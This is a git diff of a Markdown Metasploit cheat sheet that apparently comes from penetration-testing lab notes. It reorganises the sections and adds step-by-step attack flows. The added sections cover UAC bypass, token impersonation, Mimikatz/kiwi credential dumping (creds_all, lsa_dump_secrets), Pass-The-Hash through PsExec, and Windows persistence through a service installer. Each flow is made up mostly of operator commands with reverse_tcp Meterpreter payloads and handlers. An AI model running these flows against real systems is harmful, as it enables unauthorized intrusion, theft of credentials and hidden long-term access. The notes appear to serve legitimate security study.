@@ -18,14 +18,20 @@ Metasploit Framework
 		4. [SSH](#SSH)
 		5. [SMTP](#SMTP)
 	4. [Vulnerability Scanning](#Vulnerability_Scanning)
-	5. [Meterpreter](#Meterpreter)
+	5. [msfvenom](#msfvenom)
+	6. Automation
+	7. Show information gathered
+	8. [Meterpreter](#Meterpreter)
 		1. [Post exploitation](#Post_Exploitation)
 		2. [Post Modules](#Post_Modules)
-		3. [UAC Bypass](#UAC_Bypass)
 		4. Upgrade shell to meterpreter
-	6. [msfvenom](#msfvenom)
-	7. Automation
-	8. Show information gathered
+	9. [Privilege Escalation](#Privilege_Escalation)
+		1. [UAC Bypass](#UAC_Bypass)
+		2. [Token Impersonation](#Token_Impersonation)
+		3. [Pass-The-Hash](#Pass-The-Hash)
+	10. [Persistance](#Persistance)
+		1. [Windows](#Windows)
+
 
 
 ---
@@ -231,66 +237,6 @@ Finding vulnerabilities that can be exploited
 
 ---
 
-## Meterpreter
-### Post_Exploitation
-*In a meterpreter session*
-- `sysinfo` : system info
-- `getuid` : get user info
-- `help` : display commands
-- `ctrl-z` : background : send to bg
-- sessions -h : session help menu
-- `sessions -C sysinfo -i 1` : run command on session 1
-- `sessions -n test -i 1` :name the session
-- `search -d /usr/bin -f "flag*"` :  search in directory for filename
-- `shell` : spawn native shell on OS
-	- `ctrl-c` : terminate "channel" drop shell and go back to meterpreter
-- `ps` : show processes running
-- `migrate 580` : try to migrate to the process "PID" at 580, based on privileges
-- `execute -f ifconfig` : execute a command
-- `getsystem` : try to get higher privilege
-- `hashdump` : dump user hashes
-- `showmount` : show hard drives
-
-### Post_Modules
-*Useful Modules Examples*
-- `search migrate` : look for migrate modules
-- `post/windows/gather/win_privs` : shows privileges you have
-- `post/windows/gather/enum_logged_on_users` : shows logged in users and SID
-- `post/windows/gather/checkvm` : check if VM
-- `post/windows/gather/enum_applications` : check installed apps and versions
-- `post/windows/gather/enum_av_excluded` : find excluded folders
-- `post/windows/gather/enum_computers` : find domain computers
-- `post/windows/gather/enume_patches` : find patches
-	- `shell` : then run `systeminfo` to gather manually
-- `post/windows/gather/enum_shares` : find shares
-- `post/windows/manage/enable_rdp` : turn on RDP
-
-### UAC_Bypass
-*Example flow*
-1. get meterpreter on host and attempt `getsystem`, doesn't work
-2. drop to `shell`, `net users` : check users on system to find users
-3. `net localgroup administrators` : find users that are administrators
-	1. current user is part of group! 
-	2. kill shell
-4. `search bypassuac` : a lot of modules here
-5. `use /exploit/windows/local/bypassuac_injection` : set module
-	1. `set payload windows/x64/meterpreter/reverse_tcp` : set payload
-	2. `set SESSION 1` : set session to run on
-	3. `set LPORT 4433` : session already using the default 4444
-	4. `set TARGET Windows\ x64` : tab completion helps
-	5. `run` : should run and open another session on target
-	6. `getsystem` : should now work on first session
-	7. `hashdump` : yay
-
-### Upgrade shell to meterpreter
-1. `sessions -u 1` : Auto upgrade cmd shell at session 1 to meterpreter
-2. `search shell_to_meterpreter` : manually control it
-	1. `set SESSION 1` : set target session
-	2. `set LHOST eth1` : set local host
-	4. `run`
-
----
-
 ## msfvenom
 ### Generating_Payloads
 - `msfvenom --list payloads | less` : list out all the payloads
@@ -359,3 +305,128 @@ Depends on workspace and modules ran within
 - `creds` : shows credentials
 - `vulns -p 445` : can show discovered vulnerabilities and filter by port
 - `search cve:2017 name:smb` : search for cve year and name
+
+---
+
+## Meterpreter
+### Post_Exploitation
+*In a meterpreter session*
+- `sysinfo` : system info
+- `getuid` : get user info
+- `help` : display commands
+- `ctrl-z` : background : send to bg
+- sessions -h : session help menu
+- `sessions -C sysinfo -i 1` : run command on session 1
+- `sessions -n test -i 1` :name the session
+- `search -d /usr/bin -f "flag*"` :  search in directory for filename
+- `shell` : spawn native shell on OS
+	- `ctrl-c` : terminate "channel" drop shell and go back to meterpreter
+- `ps` : show processes running
+- `migrate 580` : try to migrate to the process "PID" at 580, based on privileges
+- `execute -f ifconfig` : execute a command
+- `getsystem` : try to get higher privilege
+- `hashdump` : dump user hashes
+- `showmount` : show hard drives
+
+### Post_Modules
+*Useful Modules Examples*
+- `search migrate` : look for migrate modules
+- `post/windows/gather/win_privs` : shows privileges you have
+- `post/windows/gather/enum_logged_on_users` : shows logged in users and SID
+- `post/windows/gather/checkvm` : check if VM
+- `post/windows/gather/enum_applications` : check installed apps and versions
+- `post/windows/gather/enum_av_excluded` : find excluded folders
+- `post/windows/gather/enum_computers` : find domain computers
+- `post/windows/gather/enume_patches` : find patches
+	- `shell` : then run `systeminfo` to gather manually
+- `post/windows/gather/enum_shares` : find shares
+- `post/windows/manage/enable_rdp` : turn on RDP
+
+### Upgrade shell to meterpreter
+1. `sessions -u 1` : Auto upgrade cmd shell at session 1 to meterpreter
+2. `search shell_to_meterpreter` : manually control it
+	1. `set SESSION 1` : set target session
+	2. `set LHOST eth1` : set local host
+	4. `run`
+
+---
+
+## Privilege_Escalation
+
+### UAC_Bypass
+*Example Flow* - Windows
+1. get meterpreter on host and attempt `getsystem`, doesn't work
+2. drop to `shell`, `net users` : check users on system to find users
+3. `net localgroup administrators` : find users that are administrators
+	1. current user is part of group! 
+	2. kill shell
+4. `search bypassuac` : a lot of modules here
+5. `use /exploit/windows/local/bypassuac_injection` : set module
+	1. `set payload windows/x64/meterpreter/reverse_tcp` : set payload
+	2. `set SESSION 1` : set session to run on
+	3. `set LPORT 4433` : session already using the default 4444
+	4. `set TARGET Windows\ x64` : tab completion helps
+	5. `run` : should run and open another session on target
+	6. `getsystem` : should now work on first session
+	7. `hashdump` : yay
+
+### Token_Impersonation
+*Example Flow* - Windows
+- SeAssignPrimaryToken : This allows a user to impersonate tokens
+- SeCreateToken : This allows a user to create an arbitrary token with administrator privileges
+- SeImpersonatePrivilege : This allows a user to create a process under the security context of another user typically with administrative privileges
+1. get access to machine with meterpreter session
+	1. `sysinfo` : grab info on system
+	2. `getuid` : show userinfo
+	3. `getprivs` : can see we have **SeImpersonatePrivilege**
+	4. `load incognito` : load module 
+		1. `list_tokens -u` : show available tokens
+		2. `impersonate_token "ATTACKDEFENSE\Administrator"` : impersonate a delegation token that was available
+	5. `getuid` : we are now administrator
+	6. `hashdump` : will fail, we need to migrate to another process
+	7. `ps` : show process : `migrate 3544` : migrate to *explorer* which is running as administrator
+	8. `hashdump` : will now work!
+
+### Mimikatz
+*Example Flow* - Windows
+- Can transfer Mimikatz binary to target or use meterpreter kiwi extension in memory.
+1. Get a meterpreter session on the target
+2. `sysinfo` : system information
+3. `pgrep lsass` : find lsass process : `migrate <PID>` migrate to the process
+4. `load kiwi` : load kiwi extension : `help` : show commands
+	1. `creds_all` : dump all credentials
+	2. `lsa_dump_sam` : dump LSA SAM
+	3. `lsa_dump_secrets` : SysKey
+
+### Pass-The-Hash
+*Example Flow* - Windows
+- Pass-The-Hash with **PsExec**
+- uses the *NTLM* hash to login via *SMB*
+1. Get access to the target and get a meterpreter session.
+2. dump the hashes and save them
+3. `search psexec` : find PsExec module
+4. `use exploit/windows/smb/psexec`
+	1. `set payload windows/x64/meterpreter/reverse_tcp`
+	2. `set SMBUser <user>`
+	3. `set SMBPass <LM:NTLM-Hash>`
+
+
+---
+
+## Persistance
+### Windows
+*Example Flow*
+1. Get meterpreter session on target
+	1. `sysinfo` : grab what version of windows
+	2. `getuid` : need administrator access for persistance
+3. `search platform:windows persistence` : look for modules
+4. `exploit/windows/local/persistense_service` : service installer
+	1. `set payload windows/meterpreter/reverse_tcp`
+	2. `set SERVICE_NAME <name>` : set servce name
+	3. `set session 1` : set session target
+5. `sessions -K` : kill all sessions
+6. `use multi/handler` : set up handler with same payload and ports
+	1. `set payload windows/meterpreter/reverse_tcp`
+	2. `set lport <port>` : set same port as persistance
+	3. `run`
+
